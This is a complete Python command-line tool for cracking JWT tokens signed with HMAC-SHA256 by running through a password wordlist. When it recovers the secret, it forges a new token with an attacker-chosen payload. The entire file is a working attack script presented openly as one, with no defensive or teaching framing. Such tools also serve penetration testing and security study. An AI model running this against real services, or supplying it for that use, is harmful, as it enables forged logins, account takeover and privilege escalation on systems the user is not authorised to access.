import argparse
import base64
import hashlib
import hmac
import json
import sys

try:
    from tqdm import tqdm
except ImportError:
    print("Please install tqdm: pip install tqdm", file=sys.stderr)
    sys.exit(1)

def b64url_encode(data: bytes) -> str:
    """Encode bytes to Base64URL string without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

def b64url_decode(data: str) -> bytes:
    """Decode Base64URL-encoded string to bytes, handling padding."""
    padding = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)

def compute_hmac_sha256(key: bytes, data: bytes) -> bytes:
    """Compute HMAC-SHA256 for given key and data."""
    return hmac.new(key, data, hashlib.sha256).digest()

def forge_jwt(key: bytes, header_b64: str, new_payload: dict) -> str:
    """Forge a new JWT with the same header and a new payload, signed by given key."""
    header_json = json.loads(b64url_decode(header_b64))
    # Encode header and payload
    h_enc = b64url_encode(json.dumps(header_json, separators=(",", ":")).encode())
    p_enc = b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())
    signing_input = f"{h_enc}.{p_enc}".encode()
    sig_enc = b64url_encode(compute_hmac_sha256(key, signing_input))
    return f"{h_enc}.{p_enc}.{sig_enc}"

def main():
    parser = argparse.ArgumentParser(
        description="Dictionary attack on HMAC-SHA256 JWT with optional forging"
    )
    parser.add_argument(
        "--token", "-t", required=True,
        help="JWT token in the format header.payload.signature"
    )
    parser.add_argument(
        "--wordlist", "-w", required=True,
        help="Path to wordlist file (e.g. rockyou.txt)"
    )
    parser.add_argument(
        "--new-payload", "-p", default=None,
        help="Optional JSON string for new payload to forge a token after cracking"
    )
    args = parser.parse_args()

    # Split and validate token
    try:
        header_b64, payload_b64, sig_b64 = args.token.split(".")
    except ValueError:
        print("Token must be in the format header.payload.signature", file=sys.stderr)
        sys.exit(1)

    signing_input = f"{header_b64}.{payload_b64}".encode()
    try:
        target_sig = b64url_decode(sig_b64)
    except Exception as e:
        print(f"Invalid signature encoding: {e}", file=sys.stderr)
        sys.exit(1)

    # Count total lines for progress bar
    try:
        with open(args.wordlist, 'r', encoding='latin-1', errors='ignore') as f:
            total = sum(1 for _ in f)
    except Exception as e:
        print(f"Could not read wordlist: {e}", file=sys.stderr)
        sys.exit(1)

    print(f"Starting brute-force with {total} candidates...")

    # Brute-force loop
    with open(args.wordlist, 'r', encoding='latin-1', errors='ignore') as f:
        for line in tqdm(f, total=total, desc="Progress", unit="word"):
            key = line.strip().encode()
            digest = compute_hmac_sha256(key, signing_input)
            if hmac.compare_digest(digest, target_sig):
                try:
                    key_str = key.decode()
                except UnicodeDecodeError:
                    key_str = repr(key)
                print(f"\nFound secret key: {key_str}")

                # If new payload provided, forge a new token
                if args.new_payload:
                    try:
                        new_payload = json.loads(args.new_payload)
                    except json.JSONDecodeError as e:
                        print(f"Invalid new-payload JSON: {e}", file=sys.stderr)
                        sys.exit(1)
                    new_token = forge_jwt(key, header_b64, new_payload)
                    print(f"Forged JWT: {new_token}")
                sys.exit(0)

    print("\nNo matching key found.")

if __name__ == "__main__":
    main()

